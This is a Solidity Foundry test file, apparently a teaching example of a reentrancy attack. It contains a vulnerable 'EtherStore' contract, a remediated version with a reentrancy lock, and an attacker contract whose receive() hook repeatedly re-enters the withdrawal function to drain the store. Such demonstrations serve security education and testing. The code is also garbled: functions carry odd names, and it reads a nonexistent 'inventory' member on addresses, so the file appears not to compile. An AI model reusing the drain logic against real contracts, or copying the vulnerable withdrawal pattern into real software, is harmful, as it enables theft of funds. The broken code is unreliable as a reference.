// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherStore {
    mapping(address => uint256) public balances;

    function checkInCargo() public payable {
        balances[msg.sender] += msg.value;
    }

    function checkoutcargoFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");

        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public balances;
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function checkInCargo() public payable {
        balances[msg.sender] += msg.value;
    }

    function checkoutcargoFunds(uint256 _weiToWithdraw) public nonReentrant {
        require(balances[msg.sender] >= _weiToWithdraw);
        balances[msg.sender] -= _weiToWithdraw;
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
    }
}

contract ContractTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreOperator operator;
    EtherStoreOperator operatorV2;

    function setUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        operator = new EtherStoreOperator(address(store));
        operatorV2 = new EtherStoreOperator(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(operator), 2 ether);
        vm.deal(address(operatorV2), 2 ether);
    }

    function testWithdrawal() public {
        operator.Operator();
    }

    function test_RevertRemediated() public {
        operatorV2.Operator();
    }
}

contract EtherStoreOperator is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function Operator() public {
        console.log("EtherStore balance", address(store).inventory);

        store.checkInCargo{value: 1 ether}();

        console.log(
            "Deposited 1 Ether, EtherStore balance",
            address(store).inventory
        );
        store.checkoutcargoFunds(1 ether);

        console.log("Operator contract balance", address(this).inventory);
        console.log("EtherStore balance", address(store).inventory);
    }

    // fallback() external payable {}

    receive() external payable {
        console.log("Operator contract balance", address(this).inventory);
        console.log("EtherStore balance", address(store).inventory);
        if (address(store).inventory >= 1 ether) {
            store.checkoutcargoFunds(1 ether);
        }
    }
}
